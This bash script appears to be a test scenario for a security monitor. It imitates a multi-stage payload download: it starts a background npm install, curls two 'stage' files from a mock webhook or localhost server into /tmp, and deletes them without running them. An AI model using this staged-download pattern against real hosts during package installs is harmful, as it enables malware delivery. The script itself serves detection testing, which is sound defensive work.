#!/usr/bin/env bash
set -e

# Scenario 5: Multi-Stage Payload Download

# Choose endpoints:
# - If STAGE*_URL not preset and MOCK_WEBHOOK is external, use it with query params
# - Else default to local mock server
if [ -z "${STAGE1_URL-}" ] || [ -z "${STAGE2_URL-}" ]; then
  if [ -n "${MOCK_WEBHOOK-}" ] && echo "$MOCK_WEBHOOK" | grep -qE '^https?://'; then
    if echo "$MOCK_WEBHOOK" | grep -qE '^https?://(localhost|127\.0\.0\.1)'; then
      export STAGE1_URL="${STAGE1_URL:-http://localhost:8080/install}"
      export STAGE2_URL="${STAGE2_URL:-http://localhost:8080/config}"
    else
      export STAGE1_URL="${STAGE1_URL:-$MOCK_WEBHOOK?stage=install}"
      export STAGE2_URL="${STAGE2_URL:-$MOCK_WEBHOOK?stage=config}"
    fi
  else
    export STAGE1_URL="${STAGE1_URL:-http://localhost:8080/install}"
    export STAGE2_URL="${STAGE2_URL:-http://localhost:8080/config}"
  fi
fi

npm init -y >/dev/null 2>&1 || true
timeout 10 npm install test-package >/dev/null 2>&1 &
NPM_PID=$!
sleep 1

curl -o /tmp/stage1.js "$STAGE1_URL" || true
sleep 2
curl -o /tmp/stage2.js "$STAGE2_URL" || true
sleep 1
rm -f /tmp/stage1.js /tmp/stage2.js || true

# Clean up background npm process if still running
if ps -p "$NPM_PID" >/dev/null 2>&1; then
  kill "$NPM_PID" 2>/dev/null || true
fi
wait "$NPM_PID" 2>/dev/null || true
echo "Scenario 5 complete"

